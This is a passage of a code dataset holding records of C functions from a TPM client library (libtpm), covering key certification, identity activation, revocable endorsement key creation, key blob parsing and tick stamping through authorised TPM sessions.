nonceodd2[TPM_NONCE_SIZE];\n\n\t\tTSS_gennonce(nonceodd2);\n\n\t\tret = TSS_SessionOpen(SESSION_OSAP|SESSION_OIAP|SESSION_DSAP,\n\t\t                      &sess,\n\t\t                      certKeyAuth, TPM_ET_KEYHANDLE, certhandle);\n\n\t\tif (0 != ret) {\n\t\t\treturn ret;\n\t\t}\n\t\tret = TSS_SessionOpen(SESSION_OIAP,\n\t\t                      &sess2,\n\t\t                      usageAuth,0,0);\n\t\tif (0 != ret) {\n\t\t\tTSS_SessionClose(&sess);\n\t\t\treturn ret;\n\t\t}\n\n\t\tret = TSS_authhmac(authdata1,TSS_Session_GetAuth(&sess),TPM_HASH_SIZE,TSS_Session_GetENonce(&sess),nonceodd,c,\n\t\t                   TPM_U32_SIZE, &ordinal_no,\n\t\t                   TPM_NONCE_SIZE, antiReplay,\n\t\t                   0,0);\n\t\tif (0 != ret) {\n\t\t\tTSS_SessionClose(&sess);\n\t\t\tTSS_SessionClose(&sess2);\n\t\t\treturn ret;\n\t\t}\n\t\tret = TSS_authhmac(authdata2,TSS_Session_GetAuth(&sess2),TPM_HASH_SIZE,TSS_Session_GetENonce(&sess2),nonceodd2,c,\n\t\t                   TPM_U32_SIZE, &ordinal_no,\n\t\t                   TPM_NONCE_SIZE, antiReplay,\n\t\t                   0,0);\n\t\tif (0 != ret) {\n\t\t\tTSS_SessionClose(&sess);\n\t\t\tTSS_SessionClose(&sess2);\n\t\t\treturn ret;\n\t\t}\n\t\tret = TSS_buildbuff(\"00 c3 T l l l % L % o % L % o %\", &tpmdata,\n\t\t                             ordinal_no,\n\t\t                               certHandle_no,\n\t\t                                 keyHandle_no,\n\t\t                                   TPM_HASH_SIZE, antiReplay,\n\t\t                                     TSS_Session_GetHandle(&sess),\n\t\t                                       TPM_NONCE_SIZE,nonceodd,\n\t\t                                         c,\n\t\t                                           TPM_HASH_SIZE, authdata1,\n\t\t                                             TSS_Session_GetHandle(&sess2),\n\t\t                                               TPM_NONCE_SIZE,nonceodd2,\n\t\t                                                 c,\n\t\t                                                   TPM_HASH_SIZE,authdata2);\n\n\n\t\tif (( ret & ERR_MASK ) !=  0) {\n\t\t\tTSS_SessionClose(&sess);\n\t\t\tTSS_SessionClose(&sess2);\n\t\t\treturn ret;\n\t\t}\n\n\t\tret = TPM_Transmit(&tpmdata,\"CertifyKey - AUTH2\");\n\t\tTSS_SessionClose(&sess);\n\t\tTSS_SessionClose(&sess2);\n\n\t\tif (0 != ret) {\n\t\t\treturn ret;\n\t\t}\n\n\t\tci_size = TPM_GetCertifyInfoSize(&tpmdata.buffer[TPM_DATA_OFFSET]);\n\t\tret = tpm_buffer_load32(&tpmdata, TPM_DATA_OFFSET + ci_size, &len);\n\t\tif ((ret & ERR_MASK)) {\n\t\t\treturn ret;\n\t\t}\n\n\t\tret = TSS_checkhmac2(&tpmdata,ordinal_no,nonceodd,\n\t\t                     TSS_Session_GetAuth(&sess)   , TPM_HASH_SIZE,\n\t\t                     nonceodd2,\n\t\t                     TSS_Session_GetAuth(&sess2)  , TPM_HASH_SIZE,\n\t\t                     ci_size + TPM_U32_SIZE + len , TPM_DATA_OFFSET,\n\t\t                     0,0);\n\n\t\tif (0 != ret) {\n\t\t\treturn ret;\n\t\t}\n\n\t\tif (NULL != certifyInfo_ser) {\n\t\t\tSET_TPM_BUFFER(certifyInfo_ser,\n\t\t\t               &tpmdata.buffer[TPM_DATA_OFFSET],\n\t\t\t               ci_size)\n\t\t}\n\n\t\tif (NULL != signature) {\n\t\t\tSET_TPM_BUFFER(signature,\n\t\t\t               &tpmdata.buffer[TPM_DATA_OFFSET + ci_size + TPM_U32_SIZE],\n\t\t\t               len);\n\t\t}\n\n\t} else {\n\t\tret = TSS_SessionOpen(SESSION_OIAP,\n\t\t                      &sess,\n\t\t                      usageAuth, 0, 0);\n\t\tif (0 != ret) {\n\t\t\treturn ret;\n\t\t}\n\n\t\tret = TSS_authhmac(authdata1,TSS_Session_GetAuth(&sess),TPM_HASH_SIZE,TSS_Session_GetENonce(&sess),nonceodd,c,\n\t\t                   TPM_U32_SIZE, &ordinal_no,\n\t\t                   TPM_NONCE_SIZE, antiReplay,\n\t\t                   0,0);\n\t\tif (0 != ret) {\n\t\t\tTSS_SessionClose(&sess);\n\t\t\treturn ret;\n\t\t}\n\n\t\tret = TSS_buildbuff(\"00 c2 T l l l % L % o %\", &tpmdata,\n\t\t                             ordinal_no,\n\t\t                               certHandle_no,\n\t\t                                 keyHandle_no,\n\t\t                                   TPM_HASH_SIZE, antiReplay,\n\t\t                                     TSS_Session_GetHandle(&sess),\n\t\t                                       TPM_NONCE_SIZE,nonceodd,\n\t\t                                         c,\n\t\t                                           TPM_HASH_SIZE, authdata1);\n\n\n\t\tif ((ret & ERR_MASK)) {\n\t\t\tTSS_SessionClose(&sess);\n\t\t\treturn ret;\n\t\t}\n\n\t\tret = TPM_Transmit(&tpmdata,\"CertifyKey - AUTH1\");\n\t\tTSS_SessionClose(&sess);\n\n\t\tif (0 != ret) {\n\t\t\treturn ret;\n\t\t}\n\n\t\tci_size = TPM_GetCertifyInfoSize(&tpmdata.buffer[TPM_DATA_OFFSET]);\n\t\tret = tpm_buffer_load32(&tpmdata, TPM_DATA_OFFSET + ci_size, &len);\n\t\tif ((ret & ERR_MASK)) {\n\t\t\treturn ret;\n\t\t}\n\t\tret = TSS_checkhmac1(&tpmdata,ordinal_no,nonceodd,TSS_Session_GetAuth(&sess),TPM_HASH_SIZE,\n\t\t                     ci_size + TPM_U32_SIZE + len , TPM_DATA_OFFSET,\n\t\t                     0,0);\n\n\t\tif (0 != ret) {\n\t\t\treturn ret;\n\t\t}\n\n\t\tif (NULL != certifyInfo_ser) {\n\t\t\tSET_TPM_BUFFER(certifyInfo_ser,\n\t\t\t               &tpmdata.buffer[TPM_DATA_OFFSET],\n\t\t\t               ci_size)\n\t\t}\n\n\t\tif (NULL != signature) {\n\t\t\tSET_TPM_BUFFER(signature,\n\t\t\t               &tpmdata.buffer[TPM_DATA_OFFSET + ci_size + TPM_U32_SIZE],\n\t\t\t               len);\n\t\t}\n\t}\n\treturn ret;\n}", "path": "libtpm\\keys.c", "repo_name": "mjg59/tpmtotp", "stars": 191, "license": "gpl-2.0", "language": "c", "size": 269}
{"docstring": "/* blobsize   is the size of the blob parameter                             */\n/* usageAuth  is the authorization data for the input and ID key            */\n/* ownerAuth  is the authorization data of  the owner                       */\n/* symkey     is a pointer to an area to receive the symmetric key          */\n/* symkeysize indicates the size of the symkey area on input and receives   */\n/*            the used size of symkey upon output.                          */\n/*                                                                          */\n/****************************************************************************/\n", "func_signal": "uint32_t TPM_ActivateIdentity(uint32_t keyhandle,\n                              unsigned char * blob, uint32_t blobsize,\n                              unsigned char * usageAuth,\n                              unsigned char * ownerAuth,\n                              struct tpm_buffer *symkey\n                          )", "code": "{\n\tuint32_t ret = 0;\n\tuint32_t ordinal_no = htonl(TPM_ORD_ActivateIdentity);\n\tuint32_t blobsize_no = htonl(blobsize);\n\tuint32_t keyhandle_no = htonl(keyhandle);\n\tunsigned char nonceodd[TPM_NONCE_SIZE];\n\tunsigned char c = 0;\n\n\tALLOC_TPM_BUFFER( tpmdata, 0 )\n\n\tuint32_t keylen;\n\n\tif (NULL == ownerAuth ||\n\t    NULL == symkey    ||\n\t    (NULL == blob && 0 != blobsize) ) {\n\t\treturn ERR_NULL_ARG;\n\t}\n\t\n\tif (NULL == tpmdata) {\n\t\treturn ERR_MEM_ERR;\n\t}\n\n\tret = needKeysRoom(keyhandle, 0, 0, 0);\n\tif (ret != 0) {\n\t\treturn ret;\n\t}\n\n\tTSS_gennonce(nonceodd);\n\t\n\tif (NULL != usageAuth) {\n\t\tunsigned char nonceodd2[TPM_NONCE_SIZE];\n\t\tunsigned char authdata1[TPM_NONCE_SIZE];\n\t\tunsigned char authdata2[TPM_NONCE_SIZE];\n\t\tsession sess0;\n\t\tsession sess1;\n\n\t\tTSS_gennonce(nonceodd2);\n\n\t\tret = TSS_SessionOpen(SESSION_OSAP|SESSION_OIAP|SESSION_DSAP,\n\t\t                      &sess0,\n\t\t                      usageAuth, TPM_ET_KEYHANDLE, keyhandle);\n\t\tif (0 != ret) {\n\t\t\tgoto exit;\n\t\t}\n\n\t\tret = TSS_SessionOpen(SESSION_OSAP|SESSION_OIAP,\n\t\t                      &sess1,\n\t\t                      ownerAuth, TPM_ET_OWNER, 0);\n\n\t\tif (0 != ret) {\n\t\t\tTSS_SessionClose(&sess0);\n\t\t\tgoto exit;\n\t\t}\n\n\t\tret = TSS_authhmac(authdata1,TSS_Session_GetAuth(&sess0),TPM_HASH_SIZE,TSS_Session_GetENonce(&sess0),nonceodd,c,\n\t\t                   TPM_U32_SIZE, &ordinal_no,\n\t\t                   TPM_U32_SIZE, &blobsize_no,\n\t\t                   blobsize, blob,\n\t\t                   0,0);\n\t\tif (0 != ret) {\n\t\t\tTSS_SessionClose(&sess0);\n\t\t\tTSS_SessionClose(&sess1);\n\t\t\tgoto exit;\n\t\t}\n\t\t\n\t\tret = TSS_authhmac(authdata2,TSS_Session_GetAuth(&sess1),TPM_HASH_SIZE,TSS_Session_GetENonce(&sess1),nonceodd2,c,\n\t\t                   TPM_U32_SIZE, &ordinal_no,\n\t\t                   TPM_U32_SIZE, &blobsize_no,\n\t\t                   blobsize, blob,\n\t\t                   0,0);\n\t\tif (0 != ret) {\n\t\t\tTSS_SessionClose(&sess0);\n\t\t\tTSS_SessionClose(&sess1);\n\t\t\tgoto exit;\n\t\t}\n\t\t\n\t\tret = TSS_buildbuff(\"00 c3 T l l @ L % o % L % o %\", tpmdata,\n\t\t                             ordinal_no,\n\t\t                               keyhandle_no,\n\t\t                                 blobsize, blob,\n\t\t                                   TSS_Session_GetHandle(&sess0),\n\t\t                                     TPM_NONCE_SIZE,nonceodd,\n\t\t                                       c,\n\t\t                                         TPM_HASH_SIZE, authdata1,\n\t\t                                           TSS_Session_GetHandle(&sess1),\n\t\t                                             TPM_NONCE_SIZE,nonceodd2,\n\t\t                                               c,\n\t\t                                                 TPM_HASH_SIZE,authdata2);\n\n\t\tif ((ret & ERR_MASK)) {\n\t\t\tTSS_SessionClose(&sess0);\n\t\t\tTSS_SessionClose(&sess1);\n\t\t\tgoto exit;\n\t\t}\n\t\t\n\t\tret = TPM_Transmit(tpmdata,\"ActivateIdentity - AUTH2\");\n\n\t\tTSS_SessionClose(&sess0);\n\t\tTSS_SessionClose(&sess1);\n\n\t\tif (0 != ret) {\n\t\t\tgoto exit;\n\t\t}\n\t\t\n\t\tkeylen = TSS_SymKeySize(&tpmdata->buffer[TPM_DATA_OFFSET]);\n\t\tret = TSS_checkhmac2(tpmdata,ordinal_no,nonceodd,\n\t\t                     TSS_Session_GetAuth(&sess0),    TPM_HASH_SIZE,\n\t\t                     nonceodd2,\n\t\t                     TSS_Session_GetAuth(&sess1),    TPM_HASH_SIZE,\n\t\t                     keylen,       TPM_DATA_OFFSET,\n\t\t                     0,0);\n\n\t\tif (0 != ret) {\n\t\t\tgoto exit;\n\t\t}\n\n\t\tif (symkey) {\n\t\t\tTSS_SetTPMBuffer(symkey, \n\t\t\t                 &tpmdata->buffer[TPM_DATA_OFFSET],\n\t\t\t                 keylen);\n\t\t}\n\t} else {\n\t\tunsigned char authdata[TPM_NONCE_SIZE];\n\t\tsession sess;\n\n\n\t\tret = TSS_SessionOpen(SESSION_DSAP|SESSION_OSAP|SESSION_OIAP,\n\t\t                      &sess,\n\t\t                      ownerAuth, TPM_ET_OWNER, 0);\n\n\t\tif (0 != ret) {\n\t\t\tgoto exit;\n\t\t}\n\t\t\n\t\tret = TSS_authhmac(authdata,TSS_Session_GetAuth(&sess),TPM_HASH_SIZE,TSS_Session_GetENonce(&sess),nonceodd,c,\n\t\t                   TPM_U32_SIZE, &ordinal_no,\n\t\t                   TPM_U32_SIZE, &blobsize_no,\n\t\t                   blobsize, blob,\n\t\t                   0,0);\n\t\tif (0 != ret) {\n\t\t\tTSS_SessionClose(&sess);\n\t\t\tgoto exit;\n\t\t}\n\t\t\n\t\tret = TSS_buildbuff(\"00 c2 T l l @ L % o %\", tpmdata,\n\t\t                             ordinal_no,\n\t\t                               keyhandle_no,\n\t\t                                 blobsize, blob,\n\t\t                                   TSS_Session_GetHandle(&sess),\n\t\t                                     TPM_NONCE_SIZE,nonceodd,\n\t\t                                       c,\n\t\t                                         TPM_HASH_SIZE, authdata);\n\n\t\tif ((ret & ERR_MASK)) {\n\t\t\tTSS_SessionClose(&sess);\n\t\t\tgoto exit;\n\t\t}\n\t\t\n\t\tret = TPM_Transmit(tpmdata,\"ActivateIdentity - AUTH1\");\n\t\tTSS_SessionClose(&sess);\n\n\t\tif (0 != ret) {\n\t\t\tgoto exit;\n\t\t}\n\t\t\n\t\tkeylen = TSS_AsymKeySize(&tpmdata->buffer[TPM_DATA_OFFSET]);\n\t\tret = TSS_checkhmac1(tpmdata,ordinal_no,nonceodd,TSS_Session_GetAuth(&sess),TPM_HASH_SIZE,\n\t\t                     keylen,       TPM_DATA_OFFSET,\n\t\t                     0,0);\n\n\t\tif (0 != ret) {\n\t\t\tgoto exit;\n\t\t}\n\n\n\t\tif (symkey) {\n\t\t\tTSS_SetTPMBuffer(symkey, \n\t\t\t                 &tpmdata->buffer[TPM_DATA_OFFSET],\n\t\t\t                 keylen);\n\t\t}\n\t}\n\nexit:\n\tFREE_TPM_BUFFER(tpmdata);\n\treturn ret;\n}", "path": "libtpm\\identity.c", "repo_name": "mjg59/tpmtotp", "stars": 191, "license": "gpl-2.0", "language": "c", "size": 269}
{"docstring": "/*                 of valid bytes on output                                 */\n/* outData      is a pointer to a buffer that will receive the signed       */\n/*              public key on return                                        */\n/* outDataSize  is a pointer to an integer that holds the size of the       */\n/*               outData buffer on input and the actual numbers of valid    */\n/*              data used in that buffer on output.                         */\n/****************************************************************************/\n", "func_signal": "uint32_t TPM_CertifyKey2(uint32_t certhandle,\n                         uint32_t keyhandle,\n                         unsigned char * migrationPubDigest,\n                         unsigned char * certKeyAuth,\n                         unsigned char * usageAuth,\n                         struct tpm_buffer *certifyInfo_ser,\n                         struct tpm_buffer *signature)", "code": "{\n\tuint32_t ret = 0;\n\tuint32_t ordinal_no = htonl(TPM_ORD_CertifyKey2);\n\tunsigned char c = 0;\n\tunsigned char authdata1[TPM_NONCE_SIZE];\n\tunsigned char antiReplay[TPM_HASH_SIZE];\n\tunsigned char nonceodd[TPM_NONCE_SIZE];\n\tSTACK_TPM_BUFFER( tpmdata )\n\tuint32_t certHandle_no = htonl(certhandle);\n\tuint32_t keyHandle_no = htonl(keyhandle);\n\tuint32_t ci_size;\n\tuint32_t len;\n\tsession sess;\n\n\tif (NULL == certKeyAuth ||\n\t    NULL == migrationPubDigest) {\n\t\treturn ERR_NULL_ARG;\n\t}\n\n\tret = needKeysRoom(certhandle, keyhandle, 0, 0);\n\tif (ret != 0) {\n\t\treturn ret;\n\t}\n\n\tTSS_gennonce(antiReplay);\n\tTSS_gennonce(nonceodd);\n\t\n\tif (NULL != usageAuth) {\n\t\tunsigned char authdata2[TPM_NONCE_SIZE];\n\t\tunsigned char nonceodd2[TPM_NONCE_SIZE];\n\t\tsession sess2;\n\n\t\tTSS_gennonce(nonceodd2);\n\t\tret = TSS_SessionOpen(SESSION_OIAP,\n\t\t                      &sess,\n\t\t                      usageAuth,0,0);\n\t\tif (0 != ret) {\n\t\t\treturn ret;\n\t\t}\n\t\tret = TSS_SessionOpen(SESSION_OIAP,\n\t\t                      &sess2,\n\t\t                      certKeyAuth, 0,0);\n\t\tif (0 != ret) {\n\t\t\tTSS_SessionClose(&sess);\n\t\t\treturn ret;\n\t\t}\n\n\t\tret = TSS_authhmac(authdata1,TSS_Session_GetAuth(&sess),TPM_HASH_SIZE,TSS_Session_GetENonce(&sess),nonceodd,c,\n\t\t                   TPM_U32_SIZE, &ordinal_no,\n\t\t                   TPM_HASH_SIZE, migrationPubDigest,\n\t\t                   TPM_NONCE_SIZE, antiReplay,\n\t\t                   0,0);\n\t\tif (0 != ret) {\n\t\t\tTSS_SessionClose(&sess);\n\t\t\tTSS_SessionClose(&sess2);\n\t\t\treturn ret;\n\t\t}\n\t\tret = TSS_authhmac(authdata2,TSS_Session_GetAuth(&sess2),TPM_HASH_SIZE,TSS_Session_GetENonce(&sess2),nonceodd2,c,\n\t\t                   TPM_U32_SIZE, &ordinal_no,\n\t\t                   TPM_HASH_SIZE, migrationPubDigest,\n\t\t                   TPM_NONCE_SIZE, antiReplay,\n\t\t                   0,0);\n\t\tif (0 != ret) {\n\t\t\tTSS_SessionClose(&sess);\n\t\t\tTSS_SessionClose(&sess2);\n\t\t\treturn ret;\n\t\t}\n\t\tret = TSS_buildbuff(\"00 c3 T l l l % % L % o % L % o %\", &tpmdata,\n\t\t                             ordinal_no,\n\t\t                               keyHandle_no,\n\t\t                                 certHandle_no,\n\t\t                                   TPM_DIGEST_SIZE, migrationPubDigest,\n\t\t                                     TPM_HASH_SIZE, antiReplay,\n\t\t                                       TSS_Session_GetHandle(&sess),\n\t\t                                         TPM_NONCE_SIZE,nonceodd,\n\t\t                                           c,\n\t\t                                             TPM_HASH_SIZE, authdata1,\n\t\t                                               TSS_Session_GetHandle(&sess2),\n\t\t                                                 TPM_NONCE_SIZE,nonceodd2,\n\t\t                                                   c,\n\t\t                                                     TPM_HASH_SIZE,authdata2);\n\n\n\t\tif ((ret & ERR_MASK)) {\n\t\t\tTSS_SessionClose(&sess);\n\t\t\tTSS_SessionClose(&sess2);\n\t\t\treturn ret;\n\t\t}\n\n\t\tret = TPM_Transmit(&tpmdata,\"CertifyKey2 - AUTH2\");\n\t\tTSS_SessionClose(&sess);\n\t\tTSS_SessionClose(&sess2);\n\n\t\tif (0 != ret) {\n\t\t\treturn ret;\n\t\t}\n\n\t\tci_size = TPM_GetCertifyInfoSize(&tpmdata.buffer[TPM_DATA_OFFSET]);\n\t\tret = tpm_buffer_load32(&tpmdata, TPM_DATA_OFFSET + ci_size, &len);\n\t\tif ((ret & ERR_MASK)) {\n\t\t\treturn ret;\n\t\t}\n\n\t\tret = TSS_checkhmac2(&tpmdata,ordinal_no,nonceodd,\n\t\t                     TSS_Session_GetAuth(&sess)  , TPM_HASH_SIZE,\n\t\t                     nonceodd2,\n\t\t                     TSS_Session_GetAuth(&sess2) , TPM_HASH_SIZE,\n\t\t                     ci_size + TPM_U32_SIZE + len, TPM_DATA_OFFSET,\n\t\t                     0,0);\n\n\t\tif (0 != ret) {\n\t\t\treturn ret;\n\t\t}\n\n\t\tif (NULL != certifyInfo_ser) {\n\t\t\tSET_TPM_BUFFER(certifyInfo_ser,\n\t\t\t               &tpmdata.buffer[TPM_DATA_OFFSET],\n\t\t\t               ci_size)\n\t\t}\n\n\t\tif (NULL != signature) {\n\t\t\tSET_TPM_BUFFER(signature,\n\t\t\t               &tpmdata.buffer[TPM_DATA_OFFSET + ci_size + TPM_U32_SIZE],\n\t\t\t               len);\n\t\t}\n\t} else {\n\t\tTSS_gennonce(nonceodd);\n\t\tret = TSS_SessionOpen(SESSION_OIAP,\n\t\t                      &sess,\n\t\t                      certKeyAuth, 0,0);\n\t\tif (0 != ret) {\n\t\t\treturn ret;\n\t\t}\n\n\t\tret = TSS_authhmac(authdata1,TSS_Session_GetAuth(&sess),TPM_HASH_SIZE,TSS_Session_GetENonce(&sess),nonceodd,c,\n\t\t                   TPM_U32_SIZE, &ordinal_no,\n\t\t                   TPM_HASH_SIZE, migrationPubDigest,\n\t\t                   TPM_NONCE_SIZE, antiReplay,\n\t\t                   0,0);\n\t\tif (0 != ret) {\n\t\t\tTSS_SessionClose(&sess);\n\t\t\treturn ret;\n\t\t}\n\n\t\tret = TSS_buildbuff(\"00 c2 T l l l % % l % o %\", &tpmdata,\n\t\t                             ordinal_no,\n \t\t                               keyHandle_no,\n\t\t                                 certHandle_no,\n\t\t                                   TPM_DIGEST_SIZE, migrationPubDigest,\n\t\t                                     TPM_HASH_SIZE, antiReplay,\n\t\t                                       TSS_Session_GetAuth(&sess),\n\t\t                                         TPM_NONCE_SIZE,nonceodd,\n\t\t                                           c,\n\t\t                                             TPM_HASH_SIZE, authdata1);\n\n\n\t\tif ((ret & ERR_MASK)) {\n\t\t\tTSS_SessionClose(&sess);\n\t\t\treturn ret;\n\t\t}\n\n\t\tret = TPM_Transmit(&tpmdata,\"CertifyKey2 - AUTH1\");\n\t\tTSS_SessionClose(&sess);\n\n\t\tif (0 != ret) {\n\t\t\treturn ret;\n\t\t}\n\n\t\tci_size = TPM_GetCertifyInfoSize(&tpmdata.buffer[TPM_DATA_OFFSET]);\n\t\tret = tpm_buffer_load32(&tpmdata, TPM_DATA_OFFSET + ci_size, &len);\n\t\tif ((ret & ERR_MASK)) {\n\t\t\treturn ret;\n\t\t}\n\n\t\tret = TSS_checkhmac1(&tpmdata,ordinal_no,nonceodd,TSS_Session_GetAuth(&sess),TPM_HASH_SIZE,\n\t\t                     ci_size + TPM_U32_SIZE + len , TPM_DATA_OFFSET,\n\t\t                     0,0);\n\n\t\tif (0 != ret) {\n\t\t\treturn ret;\n\t\t}\n\n\t\tif (NULL != certifyInfo_ser) {\n\t\t\tSET_TPM_BUFFER(certifyInfo_ser,\n\t\t\t               &tpmdata.buffer[TPM_DATA_OFFSET],\n\t\t\t               ci_size)\n\t\t}\n\n\t\tif (NULL != signature) {\n\t\t\tSET_TPM_BUFFER(signature,\n\t\t\t               &tpmdata.buffer[TPM_DATA_OFFSET + ci_size + TPM_U32_SIZE],\n\t\t\t               len);\n\t\t}\n\t}\n\treturn ret;\n}", "path": "libtpm\\keys.c", "repo_name": "mjg59/tpmtotp", "stars": 191, "license": "gpl-2.0", "language": "c", "size": 269}
{"docstring": "/*                                                                          */\n/* The arguments are ...                                                    */\n/*                                                                          */\n/* genreset     a boolean that determines whether to generate ekreset       */\n/* inputekreset A pointer to a hash that is used as ekreset if genreset is  */\n/*              FALSE                                                       */\n/* pubkeybuff   A pointer to an area that will hold the public key          */\n/* pubkeybuflen is the size of the pubkeybuff as given by the caller and    */\n/*              on returns the number of bytes copied into that buffer      */\n/****************************************************************************/\n", "func_signal": "uint32_t TPM_CreateRevocableEK(TPM_BOOL genreset,\n                               unsigned char * inputekreset,\n                               pubkeydata * pubkey)", "code": "{\n\tunsigned char nonce[TPM_HASH_SIZE];\n\tSTACK_TPM_BUFFER( tpmdata)\n\tkeydata k;\n\tuint32_t ret;\n\tuint32_t ordinal_no = htonl(TPM_ORD_CreateRevocableEK);\n\tint serkeylen;\n\tSTACK_TPM_BUFFER(serkey)\n\tuint32_t size;\n\n\tmemset(&k, 0x0, sizeof(k));\n\tk.pub.algorithmParms.algorithmID = TPM_ALG_RSA;\n\tk.pub.algorithmParms.encScheme = TPM_ES_RSAESOAEP_SHA1_MGF1;\n\tk.pub.algorithmParms.sigScheme = TPM_SS_RSASSAPKCS1v15_SHA1;\n\tk.pub.algorithmParms.u.rsaKeyParms.keyLength = 2048;\n\tk.pub.algorithmParms.u.rsaKeyParms.numPrimes = 2;\n\tk.pub.algorithmParms.u.rsaKeyParms.exponentSize = 0;\n\t\n\tTSS_gennonce(nonce);\n\t\n\tserkeylen = TPM_WriteKeyInfo(&serkey, &k);\n\n\tif ( (serkeylen & ERR_MASK) != 0 ) {\n\t\treturn serkeylen;\n\t}\n\n\tif (FALSE == genreset) {\n\t\tret = TSS_buildbuff(\"00 c1 T l % % o %\",&tpmdata,\n\t\t                             ordinal_no,\n\t\t                               TPM_HASH_SIZE, nonce,\n\t\t                                 serkeylen, serkey.buffer,\n\t\t                                   genreset,\n\t\t                                     TPM_HASH_SIZE, inputekreset);\n\t} else {\n\t\tunsigned char empty[TPM_HASH_SIZE];\n\t\tmemset(empty, 0x0, TPM_HASH_SIZE);\n\t\tret = TSS_buildbuff(\"00 c1 T l % % o %\",&tpmdata,\n\t\t                             ordinal_no,\n\t\t                               TPM_HASH_SIZE, nonce,\n\t\t                                 serkeylen, serkey.buffer,\n\t\t                                   genreset,\n\t\t                                     TPM_HASH_SIZE, empty);\n\t}\n\n\tif ((ret & ERR_MASK)) {\n\t\treturn ret;\n\t}\n\t\n\tret = TPM_Transmit(&tpmdata,\"CreateRevocableEK\");\n\n\tif (0 != ret) {\n\t\treturn ret;\n\t}\n\n\tsize = TSS_PubKeyExtract(&tpmdata, TPM_DATA_OFFSET, pubkey);\n\t/*\n\t * Verify the checksum...\n\t */\n\t{\n\t\tSHA_CTX sha;\n\t\tunsigned char digest[TPM_DIGEST_SIZE];\n\t\tSHA1_Init(&sha);\n\t\tSHA1_Update(&sha,\n\t\t            &tpmdata.buffer[TPM_DATA_OFFSET],\n\t\t            size);\n\t\tSHA1_Update(&sha,\n\t\t            nonce,\n\t\t            TPM_HASH_SIZE);\n\t\tSHA1_Final(digest,&sha);\n\t\tif (0 != memcmp(digest,\n\t\t                &tpmdata.buffer[TPM_DATA_OFFSET+size],\n\t\t                TPM_DIGEST_SIZE)) {\n\t\t\tret = -1;\n\t\t}\n\t}\n\n\treturn ret;\n}", "path": "libtpm\\keys.c", "repo_name": "mjg59/tpmtotp", "stars": 191, "license": "gpl-2.0", "language": "c", "size": 269}
{"docstring": "/****************************************************************************/\n/*                                                                          */\n/* Extract a Pubkey Blob from a Key Blob                                    */\n/*                                                                          */\n/****************************************************************************/\n", "func_signal": "void TSS_Key2Pub(unsigned char *keybuff, unsigned char *pkey, unsigned int *plen)", "code": "{\n   int srcoff1;\n   int srcoff2;\n   int srcoff3;\n   int dstoff1;\n   int dstoff2;\n   int dstoff3;\n   int len1;\n   int len2;\n   int len3;\n   \n   int pointer;\n   int parmsize;\n   int pcrisize;\n   int pubksize;\n\n   srcoff1 = TPM_U32_SIZE + TPM_U16_SIZE + TPM_U32_SIZE + 1;\n   dstoff1 = 0;\n   len1   = TPM_U32_SIZE + TPM_U16_SIZE + TPM_U16_SIZE + TPM_U32_SIZE;\n   memcpy(pkey+dstoff1,keybuff+srcoff1,len1);\n   dstoff2 = dstoff1 + len1;\n   srcoff2 = srcoff1 + len1;\n   pointer = srcoff1 + TPM_U32_SIZE + TPM_U16_SIZE + TPM_U16_SIZE;\n   parmsize = LOAD32(keybuff,pointer);\n   len2 = parmsize;\n   memcpy(pkey+dstoff2,keybuff+srcoff2,len2);\n   pointer = pointer + TPM_U32_SIZE + parmsize;\n   pcrisize = LOAD32(keybuff,pointer);\n   pointer = pointer + TPM_U32_SIZE + pcrisize;\n   pubksize = LOAD32(keybuff,pointer);\n   dstoff3 = dstoff2 + len2;\n   srcoff3 = pointer;\n   len3 = pubksize + TPM_U32_SIZE;\n   memcpy(pkey+dstoff3,keybuff+srcoff3,len3);\n   *plen = len1 + len2 + len3;\n   }\n   \n/****************************************************************************/\n/*                                                                          */\n/* Calculate the size of a Key Blob                                         */\n/*                                                                          */\n/****************************************************************************/\nint TSS_KeySize(const struct tpm_buffer *tb, unsigned int offset)\n{\n\tint      privkeylen;\n\tconst unsigned char *keybuff = tb->buffer;\n\tunsigned int len;\n\tunsigned int offset_in = offset;\n\n\toffset += 0 + 4 + TPM_U16_SIZE + TPM_U32_SIZE + 1;\n\tlen = TSS_PubKeySize(tb,offset,1);\n\tif ((len & ERR_MASK)) {\n\t\treturn len;\n\t}\n\toffset += len;\n\tprivkeylen = LOAD32(keybuff,offset);\n\toffset += TPM_U32_SIZE + privkeylen;\n\treturn (offset - offset_in);\n}", "path": "libtpm\\keys.c", "repo_name": "mjg59/tpmtotp", "stars": 191, "license": "gpl-2.0", "language": "c", "size": 269}
{"docstring": "/*           0x40000000 for the SRK                                         */\n/* usageauth The sha'ed usage password                                      */\n/* tickbuff  A pointer to an area that will hold the current ticks of the   */\n/*           TPM upon return; may be NULL                                   */\n/* sigbuf    a pointer to an area containing the signature upon returns     */\n/* sifbuflen an integer that indicates the size of the sigbuf on input and  */\n/*           the size of the valid data in sigbuf upon return               */\n/****************************************************************************/\n", "func_signal": "uint32_t TPM_TickStampBlob(uint32_t keyhandle,\n                           unsigned char * digestToStamp,\n                           unsigned char * usageauth,\n                           unsigned char * antireplay,\n                           unsigned char * tickbuff,\n                           struct tpm_buffer *signature)", "code": "{\n\tSTACK_TPM_BUFFER( tpmdata )\n\tunsigned char nonceodd[TPM_NONCE_SIZE];\n\tunsigned char authdata[TPM_NONCE_SIZE];\n  \tunsigned char c = 0;\n\tuint32_t ordinal_no = htonl(TPM_ORD_TickStampBlob);\n\tuint32_t ret;\n\tuint32_t keyhandle_no = htonl(keyhandle);\n\tuint32_t len;\n\n\tret = needKeysRoom(keyhandle, 0, 0, 0);\n\tif (ret != 0) {\n\t\treturn ret;\n\t}\n\n\tif (NULL != usageauth) {\n\t\tuint32_t size;\n\t\tsession sess;\n\t\t\n\t\tTSS_gennonce(nonceodd);\n\n\t\tret = TSS_SessionOpen(SESSION_OSAP|SESSION_OIAP,\n\t\t                      &sess,\n\t\t                      usageauth, TPM_ET_KEYHANDLE, keyhandle);\n\t\t\n\t\tif (0 != ret) {\n\t\t\treturn ret;\n\t\t}\n\t\t\n\t\tret = TSS_authhmac(authdata,/*usageauth*/TSS_Session_GetAuth(&sess),TPM_HASH_SIZE,TSS_Session_GetENonce(&sess),nonceodd,c,\n\t\t                   TPM_U32_SIZE, &ordinal_no,\n\t\t                   TPM_HASH_SIZE, antireplay,\n\t\t                   TPM_HASH_SIZE, digestToStamp,\n\t\t                   0,0);\n\n\t\tif (0 != ret) {\n\t\t\tTSS_SessionClose(&sess);\n\t\t\treturn ret;\n\t\t}\n\t\n\t\t/* build the request buffer */\n\t\tret = TSS_buildbuff(\"00 c2 T l l % % L % o %\", &tpmdata,\n\t\t                             ordinal_no,\n\t\t                               